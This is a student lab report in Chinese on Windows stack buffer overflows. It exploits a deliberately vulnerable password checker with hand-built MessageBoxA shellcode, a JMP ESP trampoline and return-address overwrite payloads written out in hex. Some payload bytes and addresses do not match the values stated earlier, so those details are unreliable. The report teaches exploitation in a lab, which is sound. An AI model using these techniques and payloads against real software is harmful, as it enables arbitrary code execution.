# 2022-10-15-shellcode实验

## 一、目标

1.   了解shellcode注入原理（2.3节&2.3.6 代码注入攻击）

2.   理解给出的弹出对话框的汇编代码

3.   通过淹没静态地址来实现shellcode的代码植入

4.   通过跳板来实现shellcode的代码植入

5.   尝试修改汇编语句的shellcode实现修改标题等简单操作

6.   在不修改StackOverrun程序源代码的情况下，构造shellcode，通过JMP ESP的方式实现通过记事本打开shellcode.txt（可使用CreateProcessA或WinExec等API）。

## 二、 测试步骤与结果

### （一） overflow_exe

#### 1. 初步测试

```c++
#include <stdio.h>
#include <windows.h>
#include <string>
#define PASSWORD "1234567"
int verify_password (char *password)
{
	int authenticated;
	char buffer[44];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);//over flowed here!	
	return authenticated;
}
main()
{
	int valid_flag=0;
	char password[1024];
	FILE * fp;
	LoadLibrary("user32.dll");//prepare for messagebox
	if(!(fp=fopen("password.txt","rw+")))
	{
		exit(0);
	}
	fscanf(fp,"%s",password);
	valid_flag = verify_password(password);
	if(valid_flag)
	{
		printf("incorrect password!\n");
	}
	else
	{
		printf("Congratulation! You have passed the verification!\n");
	}
	fclose(fp);
	system("pause");
}
```

用如下命令编译程序：

```sh
g++ .\overflow_exe.cpp -m32 -g -o overflow_exe.exe
```

创建password.txt，写入任意短错误密码，并打开程序，显示错误密码。

![image-20221015183352648](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015183352648.png)

写入正确密码，程序提示通过认证。

![image-20221015183744368](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015183744368.png)

写入长错误密码，程序无输出，短暂延时后退出，既非正确输入提示也非错误输入提示并异常退出，应存在溢出漏洞。

#### 2. 静态分析

主函数**加载user32.dll模块**，读取password.txt并将其中密码传入verify_password函数。检测其返回值为0则正确，不为0则错误。

![image-20221015184005815](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015184005815.png)

verify_password函数将密码与1234567比较返回值作为函数返回值，拷贝password到buffer中，此处可能导致溢出。

![image-20221016100903357](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016100903357.png)

#### 3. 动态分析

##### （1）跳板实现

开启动态调试，快捷键`A-b`检索0xe4ff，得到其中一个的地址为767AF237。**FF E4是JMP ESP的机器码，但在内存中是小端存储的，因此要检索内存中的E4 FF**。

![image-20221016135959017](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016135959017.png)

![image-20221016140524485](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140524485.png)

在Modules中查找user32.dll，双击后查找MessageBoxA，得到地址768082D0。

![image-20221016110426869](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016110426869.png)

在Modules中查找KERNEL32.dll，双击后查找kernel32_ExitProcessh函数，得到地址75B76850。

![image-20221016111216319](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016111216319.png)

构造shellcode，加载user32.dll库，内联汇编调用MessageBoxA函数（地址768082D0）弹出对话框，标题和内容都是buptbupt，调用ExitProcess函数（地址75B76850）结束程序，在**VC6中编译（如下写法不能在gcc中编译，gcc使用AT&T语法）**。

```c
// shellcode.cpp
#include<windows.h>
int main()
{
	HINSTANCE LibHandle;
	char dllbuf[11] = "user32.dll";
	LibHandle = LoadLibrary(dllbuf);
	_asm{
		sub sp,0x440
		xor ebx,ebx
		push ebx
		push 0x74707562		//bupt
		push 0x74707562		//bupt
		mov eax,esp
		push ebx
		push eax
		push eax
		push ebx
		mov eax,0x768082D0	//messageboxA
		call eax
		push ebx
		mov eax,0x75B76850	//exitprocess
		call eax
	}
	return 0;
}
```

将编译好的文件拷贝到宿主机，运行如下。

![image-20221016113209314](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016113209314.png)

载入IDA，查看汇编代码，在hax-view中复制对应十六进制数据。

![image-20221016113501339](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016113501339.png)

得到shellcode：`66 81 EC 40 04 33 DB 53 68 62 75 70 74 68 62 75 70 74 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF D0`。

进入verify_password函数之后，esp所指为该函数返回值。

![image-20221016120607540](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016120607540.png)

ebp压栈，epb移动，拓展48h(72d)B栈空间，存入真密码地址，存入输入密码地址，调用strcmp函数，此时栈空间如下所示，从上到下依次为：下一函数参数1地址4B，下一函数参数2地址4B，未知8B，Buffer44B，authenticated4B，未知4B，verify_password函数参数password地址4B，EBP4B，函数返回地址4B。

![image-20221016133629195](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016133629195.png)

随后调用strcpy函数类似，最终函数return前栈空间布局无变化。

![image-20221016124654106](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016124654106.png)

构造payload，44+4+4+4+4=60B 任意数据 + 4B JMP ESP地址 + 39B shellcode。

```
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 FC CA 7A 76 66 81 EC 40 04 33 DB 53 68 62 75 70 74 68 62 75 70 74 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF 90 90 90 90 90 90 90 90 90 90
```

![image-20221016133854343](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016133854343.png)

重新运行程序，执行到ret指令是，看到返回地址被替换为jmp esp的地址，执行。

![](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140617698.png)

EIP指向jmp esp，esp为0061FAA0，继续执行。

![image-20221016140914765](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140914765.png)

IDA解析了插入的shellcode并开始执行shellcode。

![image-20221016141043443](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016141043443.png)

按预期出现弹窗，随后程序执行完毕。

![image-20221016141144530](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016141144530.png)

##### （2）淹没静态地址实现

使用绝对地址时栈空间以00开头，因此返回地址后的数据不会被拷贝，strcpy函数在拷贝到F8FA6100处后截断字符串，因此将返回地址定为拷贝前的字符串中shellcode的地址。

![image-20221016143817468](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016143817468.png)

根据上图，shellcode起始地址为0061FAF8。构造payload，44+4+4+4+4=60B 任意数据 + 4B shellcode起始地址 + 39B shellcode。将buptbupt改为Buptbup7。

```
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 F8 FA 61 00 66 81 EC 40 04 33 DB 53 68 42 75 70 74 68 62 75 70 37 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF 90 90 90 90 90 90 90 90 90 90
```

![image-20221016143920192](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016143920192.png)

运行程序到ret，程序返回地址被覆盖为shellcode起始地址。

![image-20221016144332724](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016144332724.png)

按预期弹窗，随后程序执行完毕。

![image-20221016144428144](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016144428144.png)

## 三、测试结论

操作系统若未开启站执行保护会非常危险，导致攻击者以其他漏洞（溢出）作为切入点植入shellcode，进而导致任意代码执行。除站执行保护之外，开发时也要尽可能使用安全的拷贝函数。

## 四、附加题

```c
#include <windows.h>
int main() {
	WinExec("notepad shellcode.txt",SW_SHOW);
	return 0;
}
```



